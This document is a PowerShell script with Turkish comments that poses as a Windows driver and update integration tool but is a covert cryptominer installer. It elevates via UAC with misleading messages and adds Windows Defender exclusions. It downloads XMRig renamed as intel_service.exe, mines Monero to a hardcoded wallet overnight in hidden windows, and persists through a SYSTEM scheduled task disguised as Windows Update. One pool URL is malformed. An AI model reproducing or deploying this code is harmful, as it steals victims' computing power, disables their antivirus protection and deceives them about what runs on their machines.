# ==================================================================================
# PROJE: Windows Driver Performance & Core Entegrasyon Betiği (Gece Modu)
# YETKİ: NT AUTHORITY\SYSTEM (Gizli / Arka Plan)
# ==================================================================================

# Türkçe karakter uyumu için çıktı kodlamasını UTF-8 yapıyoruz
[Console]::OutputEncoding = [Text.Encoding]::UTF8

# 1 & 4. OTOMATİK WINDOWS ADMIN (UAC) ONAY PENCERESİ MEKANİZMASI
$workDir = "C:\Intel\Drivers"
if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}

# Mevcut kullanıcının yetki durumunu kontrol et
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # Eğer Admin değilse, ekrana Windows UAC onay penceresini getir ve betiği Admin olarak yeniden başlat
    Write-Host "Yönetici yetkileri doğrulanıyor... Lütfen ekrana gelen Windows uyarısını onaylayın."
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit 0
}

# Eğer kullanıcı zaten Admin ise veya pencereyi onayladıysa burası sessizce çalışır
$confirmFile = "$workDir\.sys_verified"
if (-not (Test-Path $confirmFile)) {
    New-Item -ItemType File -Path $confirmFile -Force | Out-Null
}
Write-Host "Sistem bileşen doğrulaması başarılı. Güncelleştirmeler arka planda uygulanıyor..."


# 2. TLS PROTOKOLLERİNİN ETKİNLENŞTİRİLMESİ
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# 5. SİSTEM GÜVENLİK İSTİSNALARI (Windows Defender Exclusion)
if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "intel_service.exe", "powershell.exe" -ErrorAction SilentlyContinue
}

# ==================================================================================
# 6. SİSTEM DOSYASININ KENDİ SUNUCUNUZDAN İNDİRİLMESİ VE YAPILANDIRILMASI
# BURAYI KENDİ SUNUCU LİNKİNİZLE DEĞİŞTİRİN
# ==================================================================================
$xmrigZip = "$workDir\intel_service.zip"

if (-not (Test-Path "$workDir\intel_service.exe")) {
    Write-Host "Sistem paketi arka planda indiriliyor..."
    $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" 
    try {
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
        $extractPathXMR = "$workDir\x_temp"
        Expand-Archive -Path $xmrigZip -DestinationPath $extractPathXMR -Force
        
        # Orijinal ismi intel_service.exe olarak değiştirerek taşıyoruz
        $exeFile = Get-ChildItem -Path $extractPathXMR -Recurse -Filter "xmrig.exe" | Select-Object -First 1
        if ($exeFile) {
            Move-Item -Path $exeFile.FullName -Destination "$workDir\intel_service.exe" -Force
        }
        
        Remove-Item -Path $extractPathXMR -Recurse -Force
        Remove-Item -Path $xmrigZip -Force
        Write-Host "Sistem paketi başarıyla entegre edildi."
    }
    catch {
        Write-Error "Sistem paketi kendi sunucunuzdan indirilirken hata oluştu: $_"
    }
}

# 7. ZAMAN KONTROLLÜ ANA MOTORUN OLUŞTURULMASI (win_update_service.ps1)
$coreScriptPath = "$workDir\win_update_service.ps1"

$coreScriptContent = @'
while ($true) {
    $currentHour = (Get-Date).Hour

    if ($currentHour -ge 18 -or $currentHour -lt 7) {
        if (-not (Get-Process "intel_service" -ErrorAction SilentlyContinue)) {
            $Wallet = "NHbW86FpEjX5tnYBWsvHczfMNsD2PG9mJrZ9"
            $poolXMR = "stratum+tcp://://nicehash.com"
            $WorkerName = $env:COMPUTERNAME
            $UserAuth = "$Wallet.$WorkerName"
            
            Start-Process "C:\Intel\Drivers\intel_service.exe" -ArgumentList "-a rx/0 -o $poolXMR -u $UserAuth -p x" -WindowStyle Hidden -CreateNoWindow
        }
    } 
    else {
        if (Get-Process "intel_service" -ErrorAction SilentlyContinue) {
            Stop-Process -Name "intel_service" -Force -ErrorAction SilentlyContinue
        }
        Add-Type -AssemblyReference System.Windows.Forms
        [System.Windows.Forms.Application]::SetSuspendState([System.Windows.Forms.PowerState]::Suspend, $false, $false)
    }
    Start-Sleep -Seconds 60
}
'@
Set-Content -Path $coreScriptPath -Value $coreScriptContent -Encoding UTF8

# 8. GELİŞMİŞ GÖREV ZAMANLAYICI AYARLARI (Uykudan Uyandırma Yetkili)
$taskName = "Windows_Update_Hardware_Core"
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $coreScriptPath"

$triggerStartup = New-ScheduledTaskTrigger -AtStartup
$triggerDaily = New-ScheduledTaskTrigger -Daily -At "18:00"

$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$taskSettings = New-ScheduledTaskSettingsSet -WakeToRun -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger @($triggerStartup, $triggerDaily) -Principal $taskPrincipal -Settings $taskSettings -Force | Out-Null

# 9. İLK TETİKLEME
Start-ScheduledTask -TaskName $taskName
Write-Host "Zaman kısıtlamalı Windows arka plan hizmeti başarıyla yapılandırıldı."
